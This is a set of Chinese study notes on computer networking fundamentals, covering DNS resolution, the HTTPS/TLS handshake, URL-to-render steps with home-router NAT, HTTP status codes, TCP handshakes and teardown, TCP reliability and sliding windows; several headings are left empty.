# 计算机网络

## ***dns解析的过程

#### 第 1 步：在本机进行缓存检查 (由近及远)

为了提高效率，系统会首先在本地查找，避免不必要的网络请求。检查顺序如下：

1.  **浏览器缓存 **: 浏览器会先检查自己的缓存，看看最近有没有访问过这个域名。
2.  **操作系统缓存 **: 如果浏览器缓存没有，操作系统会检查自己的缓存。
3.  **Hosts 文件**: 这是一个位于操作系统中的特殊文本文件，用户可以手动在里面定义域名和 IP 的对应关系。系统会检查这个文件。

#### 第 2 步：向本地 DNS 服务器发起请求

本机将查询请求发送给在网络设置中配置好的**本地 DNS 服务器**。从这里开始，本地 DNS 服务器将接管所有复杂的查询工作。这个过程对你的电脑来说是**递归查询 **，意思是：你（本机）只问一次，本地 DNS 服务器必须给你一个最终答案（IP 地址或“找不到”的错误）。

#### 第 3 步：本地 DNS 服务器的迭代查询之旅

本地 DNS 服务器收到请求后，会开始一个**迭代查询 **的过程，它会像侦探一样，一步步地询问，直到找到答案：

1.  **询问根域名服务器**:
    *   本地 DNS 服务器向 13 组根域名服务器中的一台发出请求：“`www.google.com` 的 IP 地址是什么？”
    *   根服务器回答：“我不知道，但 `.com` 归**顶级域名（TLD）服务器**管，这是它的地址，你去问它吧。”

2.  **询问顶级域名服务器**:
    *   本地 DNS 服务器根据根服务器给的地址，向 `.com` TLD 服务器发出请求：“`www.google.com` 的 IP 地址是什么？”
    *   TLD 服务器回答：“我也不直接知道，但 `google.com` 这个域名归**权威域名服务器**管，这是它的地址，你去问它吧。”

3.  **询问权威域名服务器**:
    *   本地 DNS 服务器再根据 TLD 服务器给的地址，向 `google.com` 的权威域名服务器发出请求：“`www.google.com` 的 IP 地址是什么？”
    *   权威服务器这次是最终的知情者，它在自己的记录中查找，找到了 `www.google.com` 对应的 IP 地址 `142.250.191.78`。
    *   权威服务器将这个最终答案回复给本地 DNS 服务器。

## ***https加密

好的，我们来一步一步、非常具体地拆解HTTPS的加密流程。这个过程主要依赖于**TLS/SSL握手**，其核心目标是**安全地协商出一套对称加密密钥**，用于后续的数据传输。

我们将以目前最主流的**TLS 1.2**握手（使用ECDHE密钥交换算法）为例，因为它最能清晰地展示每一步的作用。

### **准备阶段：TCP三次握手**

在一切开始之前，客户端（你的浏览器）和服务器（网站服务器）必须先建立一个可靠的TCP连接。

1.  **客户端 -> 服务器**: SYN (我想和你建立连接)
2.  **服务器 -> 客户端**: SYN-ACK (好的，我同意，你也确认一下)
3.  **客户端 -> 服务器**: ACK (我也确认，连接建立)

现在，双方有了一条可以通信的普通管道，但里面的数据是明文的，不安全。接下来，TLS握手开始，把这条管道变成加密管道。

---

### **核心阶段：TLS握手（The Handshake）**

#### **第1步: 客户端问候 (Client Hello)**

你的浏览器首先向服务器发送一条消息，表明意图，内容包括：

*   **支持的最高TLS版本**: "我最高支持TLS 1.3，也支持1.2和1.1"。
*   **一个客户端随机数 (`Client Random`)**: 一个32字节的随机数，用于后续生成密钥。
*   **支持的密码套件列表 (Cipher Suites)**: 这是关键！浏览器会告诉服务器它支持哪些加密算法组合。例如：
    `TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256`
    这个名字可以拆解为：
    *   `ECDHE`: 密钥交换算法 (椭圆曲线迪菲-赫尔曼密钥交换)。
    *   `RSA`: 身份验证/签名算法 (服务器用RSA证书来证明自己是谁)。
    *   `AES_128_GCM`: 对称加密算法 (用128位的AES-GCM算法加密实际的网页内容)。
    *   `SHA256`: 消息完整性校验算法。
*   **支持的压缩方法等其他信息**。

#### **第2步: 服务器回应 (Server Hello & Certificate)**

服务器收到客户端的问候后，会做出回应，包含三部分内容：

1.  **Server Hello**:
    *   **选择一个TLS版本**: 从客户端支持的列表中选择一个服务器也支持的最高版本，比如 "好的，我们就用TLS 1.2吧"。
    *   **一个服务器随机数 (`Server Random`)**: 服务器也生成一个32字节的随机数。
    *   **选择一个密码套件**: 从客户端的列表中，选择一个服务器最想用的密码套件。比如 "我们就用 `TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256` 这一套"。

2.  **Certificate**:
    *   服务器会将其**数字证书**发送给客户端。这个证书就像服务器的“身份证”，由权威的CA机构签发。
    *   **最关键的是：这个证书里包含了服务器的公钥 (Public Key)**。

3.  **Server Key Exchange**:
    *   **这是ECDHE算法的核心**。服务器会生成一对**临时的**椭圆曲线密钥（一个临时私钥，一个临时公钥）。
    *   服务器自己保留这个临时私钥，然后将**临时公钥**发给客户端。
    *   为了防止这个临时公钥被中间人篡改，服务器会用自己**证书里的私钥**对这个临时公钥进行**数字签名**。

4.  **Server Hello Done**:
    *   服务器告诉客户端：“好了，我想说的都说完了，该你了”。

#### **第3步: 客户端验证与密钥交换**

客户端收到了服务器的回应后，会执行一系列关键操作：

1.  **验证证书**:
    *   **域名检查**: 检查证书里的域名是否和你正在访问的网址一致。
    *   **有效期检查**: 检查证书是否在有效期内。
    *   **信任链检查**: 检查签发该证书的CA机构是否可信。客户端会用操作系统内置的根CA证书，逐级验证证书链，直到确认服务器证书是合法的。**如果这一步失败，浏览器就会弹出“不安全”的警告**。

2.  **验证服务器的数字签名**:
    *   客户端从服务器证书中提取出**服务器公钥**。
    *   用这个公钥去解开服务器在`Server Key Exchange`步骤中发送过来的**数字签名**，并验证服务器的临时公钥是否真实、未被篡改。

3.  **生成自己的临时密钥并发起交换**:
    *   验证通过后，客户端现在确信正在与一个合法的服务器通信。
    *   客户端也生成自己的一对**临时的**椭圆曲线密钥（一个临时私钥，一个临时公钥）。
    *   客户端自己保留临时私钥，并将**临时公钥**发送给服务器。这一步消息叫做 `Client Key Exchange`。

#### **第4步: 生成会话密钥**

现在，神奇的事情发生了：

*   **客户端**: 拥有 `客户端随机数`、`服务器随机数`、`服务器的临时公钥`、`自己的临时私钥`。
*   **服务器**: 拥有 `客户端随机数`、`服务器随机数`、`自己的临时私钥`、`客户端的临时公钥`。

根据ECDHE算法，客户端可以用“自己的临时私钥”和“服务器的临时公钥”计算出一个共享的秘密值，我们称之为**预主密钥 (Pre-Master Secret)**。

同时，服务器可以用“自己的临时私钥”和“客户端的临时公钥”计算出**完全相同的预主密钥**。

这个过程即使被黑客全程监听，由于黑客没有双方的任何一个临时私钥，也无法计算出这个预主密钥。

**然后，客户端和服务器会使用完全相同的算法，将 `客户端随机数` + `服务器随机数` + `预主密钥` 这三个值混合在一起，通过一个伪随机函数 (PRF)，生成最终的、也是本次会话唯一的“主密钥 (Master Secret)”。**

最后，再基于这个主密钥，衍生出本次会话所需的所有对称密钥，包括：
*   用于加密客户端->服务器数据的密钥
*   用于加密服务器->客户端数据的密钥
*   用于验证数据完整性的MAC密钥

#### **第5步: 握手结束**

现在双方都已经拥有了加密数据所需的所有密钥，但还需要最后确认一下。

1.  **客户端 -> 服务器**:
    *   发送一个 `Change Cipher Spec` 消息，意思是：“我准备好了，从现在开始，我发给你的所有消息都将使用我们刚刚协商好的对称密钥进行加密”。
    *   发送一个 `Encrypted Handshake Message` (也叫 `Finished` 消息)。这条消息的内容是前面所有握手消息的哈希值，然后用刚刚生成的对称密钥加密。

2.  **服务器 -> 客户端**:
    *   服务器收到后，用对称密钥解密。如果成功解密并且哈希值能对得上，就说明客户端的密钥生成是正确的，并且握手过程没有被篡改。
    *   服务器也发送一个 `Change Cipher Spec` 和一个 `Encrypted Handshake Message`给客户端。

3.  客户端解密服务器的 `Finished` 消息并验证。如果一切正常，**TLS握手正式完成！**

## ***输入url到网页渲染的过程

### 第 1 步：用户输入与 URL 解析

1.  **输入 URL**：你在浏览器地址栏输入 `https://www.google.com` 并按下回车。
2.  **智能判断**：浏览器会检查你输入的是一个搜索关键字还是一个 URL。如果是关键字，它会使用默认搜索引擎进行搜索。如果是 URL，它会开始解析。
3.  **URL 解析**：浏览器将 URL 分解成几个关键部分：
    *   **`https`** - **协议 (Protocol)**：告诉浏览器要使用 HTTPS 协议。
    *   **`www.google.com`** - **域名 (Domain Name)**：需要访问的服务器的“名字”。
    *   **(隐藏的端口)** - **端口 (Port)**：HTTPS 默认使用 `443` 端口，HTTP 默认使用 `80`。

---

### 第 2 步：DNS 查询 

1.  **浏览器缓存**：浏览器首先检查自己的缓存，看之前是否访问过这个域名。
2.  **操作系统缓存**：如果浏览器缓存没有，它会检查操作系统的缓存（包括 `hosts` 文件）。

---

### 第 3 步：建立 TCP 连接 (三次握手)

现在浏览器知道了服务器的 IP 地址，需要和它建立一个可靠的连接来传输数据。HTTPS 和 HTTP 都基于 TCP 协议。

TCP 通过一个称为“**三次握手 (Three-Way Handshake)**”的过程来建立连接：

---

### 第 4 步：TLS 安全握手

### 第 5 步：发送 HTTP 请求

安全连接建立后，浏览器终于可以向服务器发送正式的 HTTP 请求了。一个典型的 HTTP 请求包含：
### 第 6 步：服务器处理请求并返回响应

服务器（如 Nginx, Apache）接收到 HTTP 请求后：
1.  **解析请求**：服务器解析请求行和请求头，了解客户端想要什么。
2.  **处理逻辑**：如果是请求一个静态文件（如 HTML, CSS），Web 服务器可以直接从磁盘读取并返回。如果是动态请求，Web 服务器会将其转发给应用服务器（如 Node.js, Tomcat），应用服务器可能会查询数据库，执行业务逻辑，最终生成 HTML 页面。
3.  **构建响应**：服务器构建一个 HTTP 响应，包含：
    *   **状态行 (Status Line)**：`HTTP/1.1 200 OK` (协议版本、状态码、状态信息)
    *   **响应头 (Headers)**：包含服务器信息、内容类型、设置 Cookie 等。例如：
        *   `Content-Type: text/html; charset=UTF-8`
    *   **响应体 (Body)**：实际的 HTML 内容。

---

### 第 7 步：浏览器接收并解析响应

浏览器接收到服务器的响应后，会根据响应头中的 `Content-Type` 来决定如何处理。对于 `text/html`，浏览器将开始渲染页面。

---

### 第 8 步：浏览器渲染页面 (关键渲染路径)

### 第 9 步：获取额外资源与 JavaScript 执行

## url输入到网页渲染出来的流程，如果是家庭网络是怎么个流程呢（经过路由器）

### 第二阶段：家庭路由器登场与建立连接

3.  **建立TCP连接（三次握手）**: 获得了目标服务器的IP地址后，您的电脑（客户端）需要与服务器建立一个可靠的连接。这通过TCP协议的“三次握手”来完成。

4.  **家庭路由器的核心作用 - NAT**: 这是家庭网络环境下的关键一步。
    *   您的电脑在局域网（LAN）内拥有一个私有IP地址（如192.168.1.100）。这个地址在互联网上是不可见的。
    *   当请求数据包到达路由器时，路由器会执行**网络地址转换（NAT）**。 它会将数据包的源IP地址从您的电脑的私有IP，替换成路由器的公共IP地址（由ISP分配的、在互联网上唯一的地址）。
    *   同时，路由器会在其NAT表中记录下这个转换关系，包括您的私有IP、端口号以及目标服务器的IP和端口。这样，当服务器返回响应时，路由器才知道应该将数据转发给局域网内的哪一台设备。

### 第三阶段：数据传输与服务器响应

5.  **发送HTTP/HTTPS请求**: TCP连接建立后，浏览器便可以向服务器发送HTTP（或加密的HTTPS）请求了。 请求报文中包含了请求方法（如GET）、要访问的资源路径、HTTP协议版本以及其他头信息。

6.  **服务器处理请求**: 位于世界某处的Web服务器接收到请求后，会进行处理，找到用户所需的资源（通常是一个HTML文件），并准备一个HTTP响应。

7.  **服务器返回HTTP响应**: 响应报文包含状态码（如200 OK表示成功）、响应头和响应体（即HTML文件的内容）。 这个响应数据包的目标地址是您路由器的公共IP。

8.  **路由器转发响应**: 数据包返回到您的家用路由器。路由器查询NAT表，找到之前记录的映射关系，再将数据包的目标IP地址从自己的公共IP换回您电脑的私有IP，然后通过局域网将数据包准确地发送到您的设备上。

## ***网络各层有什么协议

#### 2. 数据链路层 (Data Link Layer)

数据链路层负责在**同一个局域网 (LAN)** 中、两个**物理上直接相连**的节点之间可靠地传输数据。它将来自网络层的比特流组装成**帧 (Frame)**。

*   **关键协议**：
    *   **ARP (Address Resolution Protocol, 地址解析协议)**：**非常重要**。它的作用是根据一个设备的 **IP 地址**，查询到它对应的 **MAC 地址**。这是网络层和数据链路层之间的关键桥梁。

#### 3. 网络层 (Network Layer)

网络层的核心任务是实现**网络互联 (Internetworking)**，即在广阔的、由多个不同局域网组成的互联网中，将数据包从源主机发送到目标主机。

*   **功能**：逻辑寻址（使用 IP 地址）、路由选择（规划数据包的最佳路径）。
*   **关键协议**：
    *   **IP (Internet Protocol, 网际协议)**：**本层的核心协议**。它定义了 IP 地址，并规定了数据包（Packet）的格式。它是一种“尽力而为”的、不可靠的、无连接的协议。目前主要有 **IPv4** 和 **IPv6** 两个版本。
    *   **ICMP (Internet Control Message Protocol, 网际控制报文协议)**：用于在 IP 主机、路由器之间传递控制消息，报告错误或提供诊断信息。我们常用的 `ping` 和 `traceroute` 命令就是基于 ICMP 协议的。

#### 4. 传输层 (Transport Layer)

传输层为不同主机上的**应用程序进程**之间提供端到端的通信服务。它负责数据的分段、传输、重组，并能提供可靠性保证。

*   **功能**：进程寻址（使用端口号 Port）、可靠传输、流量控制、拥塞控制。
*   **关键协议**：
    *   **TCP (Transmission Control Protocol, 传输控制协议)**：
        *   **特点**：**面向连接、可靠的**字节流服务。
        *   **工作方式**：在传输数据前，需要通过“三次握手”建立连接。传输过程中，有确认、重传、排序、流量控制等机制来确保数据无差错、不丢失、不重复且按序到达。
        *   **好比**：打电话，必须先接通，通话过程是稳定可靠的。
        *   **应用**：网页浏览 (HTTP)、文件传输 (FTP)、邮件发送 (SMTP) 等要求高可靠性的场景。
    *   **UDP (User Datagram Protocol, 用户数据报协议)**：
        *   **特点**：**无连接、不可靠的**数据报服务。
        *   **工作方式**：发送数据前不需要建立连接，直接将数据包“尽力而为”地发送出去，不保证是否到达、也不保证顺序。
        *   **好比**：寄平信，直接投进邮筒，不保证对方一定能收到。
        *   **应用**：视频直播、在线游戏、DNS 查询等对速度要求高、能容忍少量丢包的场景。

#### 5. 应用层 (Application Layer)

应用层是用户和应用程序直接接触的层次。它定义了应用程序之间进行通信和交互的规则。

*   **功能**：为特定应用提供统一的通信接口。
*   **关键协议** (数量非常多)：
    *   **HTTP/HTTPS (Hypertext Transfer Protocol/Secure)**：用于万维网（WWW）的浏览器和服务器之间的通信。
    *   **DNS (Domain Name System)**：提供域名到 IP 地址的转换服务，是互联网的“电话簿”。
    *   **FTP (File Transfer Protocol)**：用于在不同计算机之间进行文件传输。
    *   **SMTP (Simple Mail Transfer Protocol)**：用于**发送**电子邮件。
    *   **SSH (Secure Shell)**：用于安全的远程登录和执行命令。

## ***HTTP 状态码

* HTTP 状态码分为五个类别，分别以 1、2、3、4、5 开头，代表信息性、成功、重定向、客户端错误和服务器错误。

* 1xx 状态码表示请求已被接收，客户端可以继续请求。比如：101 websocket升级成功。

* 在 2xx 成功状态码中，最常见的是 **200 OK**，表示请求成功并返回数据；**201 Created** 表示服务器成功创建了新的资源（post）。

* 在 3xx 重定向中，**301 Moved Permanently 用于永久重定向**，**302 Found** 用于临时重定向，304表示缓存

* **4xx** 是客户端错误，比如 400 Bad Request 表示请求格式错误，**401 Unauthorized 表示未授权**，**403 Forbidden 表示禁止访问**，最常见的 **404 Not Found** 表示资源不存在。 

* 进一步说就是，**401**可能是token过期，**403表示知道你是谁**，但是你没有权限访问。 **400表示**你给的参数不对

* 5xx 是服务器错误，比如 500 Internal Server Error 表示服务器内部错误，503 Service Unavailable 表示服务暂时不可用。

## ***三次握手四次挥手

**挥手过程开始**：

1.  **第一次挥手 (A -> B)**
    *   **A 说**：“我的话说完了，准备挂电话了。” (A 告诉 B，我不会再给你发送任何新数据了，但如果你还有话说，我还可以听。)
    *   **技术层面**：客户端 A 发送一个 `FIN` (Finish) 报文段给服务器 B，并进入 `FIN_WAIT_1` 状态。

2.  **第二次挥手 (B -> A)**
    *   **B 说**：“好的，收到你准备挂电话的通知了。但请稍等，我这边可能还有几句话没说完，等我说完再挂。” (B 告诉 A，我已经知道你要关闭了，请等我处理完我这边的数据。)
    *   **技术层面**：服务器 B 收到 `FIN` 后，发送一个 `ACK` (Acknowledgement) 报文段作为确认。此时，B 进入 `CLOSE_WAIT` 状态。客户端 A 收到这个 `ACK` 后，进入 `FIN_WAIT_2` 状态，等待 B 发出关闭请求。
    *   **关键点**：从 B 发送 `ACK` 到 B 发送 `FIN` 之间，服务器 B 可能仍然在向客户端 A 发送数据，因为它的发送通道还没关闭。

3.  **第三次挥手 (B -> A)**
    *   **B 说**：“好了，我的话说完了，现在我也准备挂电话了。” (B 告诉 A，我这边的数据也全部发送完毕，现在可以正式关闭连接了。)
    *   **技术层面**：当服务器 B 确定自己也没有数据要发送了，它会发送一个 `FIN` 报文段给客户端 A。此时，B 进入 `LAST_ACK` 状态，等待 A 的最后确认。

4.  **第四次挥手 (A -> B)**
    *   **A 说**：“好的，收到你也要挂电话的通知了，那我们正式挂断吧。” (A 确认收到了 B 的关闭请求。)
    *   **技术层面**：客户端 A 收到 B 的 `FIN` 后，发送一个 `ACK` 报文段作为确认。然后，A 进入 `TIME_WAIT` 状态。服务器 B 收到这个 `ACK` 后，立即进入 `CLOSED` 状态，连接正式关闭。

---

### 详细的技术状态变迁图

| 步骤     | 发起方 (客户端) 状态                 | 接收方 (服务器) 状态                  | 描述                                                         |
| :------- | :----------------------------------- | :------------------------------------ | :----------------------------------------------------------- |
| **初始** | `ESTABLISHED` (已建立)               | `ESTABLISHED` (已建立)                | 双方正常通信                                                 |
| **1**    | **`FIN_WAIT_1`**  (发送FIN后)        | (不变)                                | 客户端发送 `FIN`，表示自己的发送通道关闭。                   |
| **2**    | **`FIN_WAIT_2`** (收到ACK后)         | **`CLOSE_WAIT`** (收到FIN，发送ACK后) | 服务器确认收到客户端的关闭请求。此时，服务器可能还在发送数据，客户端处于“半关闭”状态，只能收不能发。 |
| **3**    | (不变)                               | **`LAST_ACK`** (发送FIN后)            | 服务器数据发送完毕，发送自己的 `FIN`，表示自己的发送通道也关闭了。 |
| **4**    | **`TIME_WAIT`** (收到FIN，发送ACK后) | **`CLOSED`** (收到ACK后)              | 客户端确认收到服务器的关闭请求。服务器收到确认后，立即关闭连接。客户端则进入 `TIME_WAIT` 状态。 |
| **结束** | **`CLOSED`** (等待 2MSL 后)          | `CLOSED`                              | 客户端在 `TIME_WAIT` 状态等待一段时间后，也进入 `CLOSED` 状态，确保连接中的所有报文都已消失。 |

---

### 两个关键问题的解释

#### 1. 为什么需要四次挥手，而不是三次？

核心原因在于 TCP 的**半关闭 (Half-close)** 特性。当一方发送 `FIN` 时，仅仅表示它这一侧不再发送数据，但仍然可以接收数据。另一方（如服务器 B）可能还有未发送完的数据需要处理，不能立即关闭连接。因此，B 的 `ACK`（第二次挥手）和 `FIN`（第三次挥手）是**分开的**，中间可以有数据传输。这就比三次握手多出了一次。

#### 2. 为什么客户端最后要进入 `TIME_WAIT` 状态并等待 2MSL？

`TIME_WAIT` 状态是主动关闭连接方（客户端 A）必须经历的一个阶段，`MSL` (Maximum Segment Lifetime) 指的是报文在网络中最大生存时间。等待 `2*MSL` 主要有两个目的：

*   **确保最后的 ACK 能够到达服务器**：第四次挥手时，客户端发送的最后一个 `ACK` 可能会丢失。如果丢失，服务器 B 会因为收不到确认而超时重传它的 `FIN`（第三次挥手）。如果客户端 A 不等待，而是直接关闭，就无法响应这个重传的 `FIN`，导致服务器无法正常关闭。`TIME_WAIT` 状态可以确保客户端有足够的时间来重发丢失的 `ACK`。

## ***为什么不是两次握手，为什么不是三次挥手

- 假设只有两次握手。客户端发送一个 SYN 包，服务器收到后回复 SYN+ACK，连接就建立了。如果一个延迟的、失效的 SYN 包（由于网络拥塞等原因滞留）到达服务器，服务器会认为这是一个新的连接请求，并发送 SYN+ACK，然后等待客户端发送数据。这就浪费了客户端的资源。**三次握手中的 ACK 就是为了确认服务器收到了客户端的 SYN，从而避免服务器为过时的 SYN 包建立连接。**
- 假如是三次握手，有一个迟到的syn来到服务端，服务端回复一个ack，假如此时客户端已经关闭，服务端接收不到ack自然就会超时关闭这个连接。

---

### 一、一个生动的比喻：结束一场电话会议

想象你（客户端）和你的老板（服务器）正在进行一场重要的电话会议。

1.  **第一次挥手 (你 -> 老板):** 你汇报完了所有工作，于是你说：“老板，我这边的事情说完了。”
    *   **技术上**: 客户端发送一个 `FIN` 包，表示“我的数据已经发完了，我请求关闭我这一方的发送通道。” 此时，客户端进入 `FIN_WAIT_1` 状态。

2.  **第二次挥手 (老板 -> 你):** 老板听到了，但他可能还有话要对你说。他会先回应你一下：“好的，收到了，我知道你说完了。”
    *   **技术上**: 服务器收到 `FIN` 后，立刻发送一个 `ACK` 包作为回应，表示“我已收到你的关闭请求。” 此时，服务器进入 `CLOSE_WAIT` 状态，而客户端收到这个 `ACK` 后，进入 `FIN_WAIT_2` 状态。

**关键点来了：为什么不能在这里直接结束？**

> 因为虽然你已经说完了，但你的**老板可能还有最后的几点指示要交代**。你虽然不再说话（关闭了发送），但你的耳朵还得听着（接收通道仍然打开）。

3.  **第三次挥手 (老板 -> 你):** 老板交代完了所有事情，现在他也准备挂电话了。于是他说：“好了，我这边也说完了。”
    *   **技术上**: 服务器在处理完所有需要发送的数据后，也发送一个 `FIN` 包，表示“我这边的数据也发完了，我请求关闭我这一方的发送通道。” 此时，服务器进入 `LAST_ACK` 状态。

4.  **第四次挥手 (你 -> 老板):** 你听到老板也说完了，你最后回应一下：“好的，收到了，那我们挂电话吧。”
    *   **技术上**: 客户端收到服务器的 `FIN` 后，发送最后一个 `ACK` 包作为确认。发送完毕后，客户端进入 `TIME_WAIT` 状态（稍后解释），而服务器收到这个最终的 `ACK` 后，立即关闭连接。

---

### 二、为什么挥手不能是三次？

现在我们能清晰地回答这个问题了。TCP挥手不能像握手那样将第二和第三步合并的原因是：

*   **在握手时**，服务器收到客户端的 `SYN` 请求后，它自己也**没有数据要传输**，它的唯一任务就是同意连接。所以，它可以非常快地把表示“同意”的 `ACK` 和表示“我也要同步”的 `SYN` 捆绑在一个包里发出去。

*   **在挥手时**，当服务器收到客户端的 `FIN` 请求时，它仅仅意味着客户端**不再发送数据了**。但服务器自己可能还有一大堆数据正在发送队列里，需要发给客户端。
    *   TCP 协议规定，服务器必须**立刻**用一个 `ACK` 来确认收到了客户端的 `FIN`。
    *   但它**不能立刻**发送自己的 `FIN`，必须等到自己所有的数据都发送完毕后，才能发送 `FIN`。
    *   从发送 `ACK` 到发送 `FIN` 之间，可能有一段时间差。正是这个**不确定的时间差**，导致了 `ACK` 和 `FIN` 必须作为两个独立的步骤，从而构成了四次挥手。

## ***四次挥手里面的各种wait说一下，FIN_WAIT_1和FIN_WAIT_2什么区别

## ***tcp和udp什么区别

| 特性         | **TCP**                                              | **UDP**                                   |
| ------------ | ---------------------------------------------------- | ----------------------------------------- |
| 是否面向连接 | ✅ 面向连接（三次握手、四次挥手）                     | ❌ 无连接                                  |
| 可靠性       | ✅ 可靠传输（确认应答、重传机制、流量控制、拥塞控制） | ❌ 不保证可靠交付（可能丢包、乱序、重复）  |
| 数据传输方式 | 字节流（stream），没有固定边界                       | 报文（datagram），一发一收，不合并不拆分  |
| 传输效率     | 相对较低（有握手、确认、重传等开销）                 | 高效（无握手，无额外控制开销）            |
| 首部开销     | 20~60 字节                                           | 8 字节                                    |
| 适合场景     | 对可靠性要求高：HTTP、HTTPS、FTP、SMTP、IMAP         | 对实时性要求高：DNS、VoIP、视频直播、游戏 |

## ***TCP实现可靠传输的原理

### 一、核心问题：网络本身是不可靠的

首先要明白，TCP之所以需要这些机制，是因为它底层的网络（比如IP协议）是“尽力而为”的，本身不可靠，会发生各种问题：

*   **数据包丢失**：路由器可能因为拥堵而丢弃数据包。
*   **数据包乱序**：数据包走的路径不同，后发的可能先到。
*   **数据包出错**：在物理传输中，数据位可能发生翻转（0变1）。
*   **数据包重复**：重传等原因可能导致接收方收到重复的数据。

TCP的设计目标就是解决以上所有问题。

---

### 二、TCP保证可靠传输的四大核心机制

#### 1. 序列号 (Sequence Number) 与 确认应答 (Acknowledgement, ACK)

这是TCP可靠性的基石。

*   **机制**：
    1.  **编号 (序列号)**：TCP将发送的数据看作一个连续的字节流。在建立连接时，双方会各自确定一个初始序列号。之后，发送的每一个数据包（TCP Segment）都会携带一个序列号，代表这个包中第一个字节在整个数据流中的位置。
    2.  **确认 (ACK)**：接收方每收到一个数据包，都会发送一个确认包（ACK包）给发送方。这个ACK包里会包含一个“确认号”，它的值是**期望下次收到的字节的序列号**。例如，接收方收到了序列号为1-1000的数据，它就会回复一个确认号为1001的ACK，意思是：“1000及之前的数据我都收到了，请你下次从1001开始发。”

*   **解决的问题**：
    *   **保证数据有序**：接收方可以根据序列号对收到的数据包进行排序，即使它们是乱序到达的。
    *   **确认数据到达**：发送方收到了ACK，就知道对方确实收到了数据。
    *   **识别和丢弃重复数据**：接收方如果收到一个已经确认过的序列号的数据包，就会直接丢弃它。

#### 2. 超时重传 (Retransmission Timeout)

如果快递送丢了，快递系统必须能发现并重新派送。

*   **机制**：
    1.  **设定计时器**：发送方每发送一个数据包，就会启动一个计时器（Retransmission Timer）。
    2.  **等待确认**：如果在计时器超时之前，收到了接收方对这个数据包的确认（ACK），就关闭计时器。
    3.  **超时重传**：如果计时器到时了还没收到ACK，发送方就**假定这个数据包在路上丢失了**，于是会**重新发送**这个数据包。

*   **解决的问题**：
    *   **数据包丢失**：这是处理数据包丢失最核心的机制。

> **优化**：除了超时重传，还有一个更高效的“**快速重传**”机制。如果发送方连续收到三个内容相同的ACK（比如都是请求第1001字节），它不等计时器超时，就会立刻意识到第1001字节之前的数据包很可能丢了，于是立即重传，提高了效率。

#### 3. 校验和 (Checksum)

确保收到的快递包裹内容没有在运输途中被损坏。

*   **机制**：
    1.  **计算**：发送方在发送数据前，会对TCP头部和数据部分计算一个16位的校验和。这个值会写在TCP头部。
    2.  **验证**：接收方收到数据后，会用同样的方法重新计算一遍校验和。
    3.  **比对**：如果计算出的值和收到的TCP头部中的校验和不一致，说明数据在传输过程中发生了错误。接收方会**直接丢弃这个错误的数据包**（并且不会发送ACK）。

*   **解决的问题**：
    *   **数据包出错**：保证了数据的完整性和准确性。发送方因为收不到ACK，会通过超时重传机制重新发送正确的数据。

#### 4. 流量控制 (Flow Control) 与 拥塞控制 (Congestion Control)

确保不会因为送货太快而把收件人的家门口堵死，或者把整个城市的交通搞瘫痪。

*   **流量控制 (Flow Control)**：
    *   **目的**：防止发送方发送数据太快，导致**接收方的缓冲区溢出**。这是点对点的控制。
    *   **机制**：接收方在发送的ACK包中，会包含一个“**窗口大小(Window Size)**”字段。这个值告诉发送方：“我现在的缓冲区还能接收多少字节的数据”。发送方根据这个值来动态调整自己的发送速率。如果接收方返回窗口大小为0，发送方就会暂停发送，直到收到一个非0的窗口更新。

*   **拥塞控制 (Congestion Control)**：
    *   **目的**：防止过多数据注入到**网络**中，导致整个网络（比如路由器）过载、拥堵甚至瘫痪。这是全局性的控制。
    *   **机制**：这是一个复杂的动态算法，核心思想是“**慢启动、拥塞避免**”。发送方内部维护一个“拥塞窗口(cwnd)”，一开始窗口很小，然后以指数级增长（慢启动）。当增长到一定阈值或检测到网络拥塞（比如发生丢包），就减小窗口，进入线性增长阶段（拥塞避免），从而控制对整个网络的冲击。

### 总结

| 机制                           | 解决的核心问题                         | 工作方式                                                 |
| :----------------------------- | :------------------------------------- | :------------------------------------------------------- |
| **序列号与确认应答 (Seq/Ack)** | 保证数据**有序**、**无重复**、确认到达 | 对每个字节进行编号，接收方通过确认号告知期望的下一个字节 |
| **超时重传**                   | 解决数据**丢失**问题                   | 发送数据后启动计时器，若超时未收到确认则重新发送         |
| **校验和 (Checksum)**          | 解决数据**出错**问题                   | 发送方计算并附加校验和，接收方验证，若不符则丢弃         |
| **流量控制与拥塞控制**         | 防止**接收方**或**网络**过载           | 通过滑动窗口大小来调节发送速率，避免压垮接收方或网络     |

正是通过这几套机制的协同工作，TCP才能够在不可靠的IP网络之上，构建起一个稳定、可靠的数据传输通道。

## ***session和cookie的区别

## ***OSI七层模型和tcp五层

* **应用层**：直接向用户应用程序提供网络服务。定义了用户程序发送请求的规则
* **表示层**：**数据加密和解密**，数据压缩和解压缩。
* **会话层**：会话层（第五层）主要负责管理**应用程序之间**的通信会话，或者说是建立、管理和终止**进程间的对话**。还要对话控制，全双工，半双工
* **传输层**：这一层主要是建立端到端的连接，要建立两个正确的端口号的连接，tcp
* **网络层**：主要是定义一个在整个互联网寻址的规则，ip寻址。
* **网络接口层**：主要解决在局域网怎么寻址路由封包的问题，mac地址来寻址
* **物理层**：主要解决0和1怎么转化为信号在物理链路上传输的问题

## ***哪些应用是udp，哪些用是tcp

* **TCP:**HTTP / HTTPS,FTP（文件传输协议）,SMTP（简单邮件传输协议）
* **UDP**：DNS（域名系统），实时视频和语音传输，在线游戏

## ***滑动窗口、拥塞控制

### 2. 滑动窗口是什么？一个形象的比喻

你可以把滑动窗口想象成发送方和接收方之间的一个“**合同**”或“**信用额度**”。

*   **发送方 (Sender)**: 维护一个**发送窗口**。
*   **接收方 (Receiver)**: 维护一个**接收窗口**。

这个“合同”规定了：“在当前时刻，发送方 A 最多可以连续发送多少字节的数据给接收方 B，而无需等待 B 对每一个字节的确认。” 这个“多少字节”就是**窗口的大小 (Window Size)**。

#### 发送窗口的内部结构

发送方的数据缓冲区可以被分为四个部分，而发送窗口就架在其中的两部分之上：

```
|-----------------------------------------------------------------|
|  #1: 已发送且已确认  |  #2: 已发送但未确认  |  #3: 未发送但允许发送 |  #4: 未发送且不允许发送 |
|-----------------------------------------------------------------|
                      <--------------------->
                         发送窗口 (Window)
```

*   **#1 (Sent and ACKed)**: 这部分数据已经发送成功，并且收到了对方的确认，可以被丢弃了。
*   **#2 (Sent but Not Yet ACKed)**: 这部分数据已经发送出去，但还没有收到确认。这是“在途”的数据，发送方必须暂时保留它们，以备超时重传。
*   **#3 (Not Sent but Ready to Send)**: 这部分数据是窗口内允许发送的、但尚未发送的数据。发送方可以立即发送这部分数据。
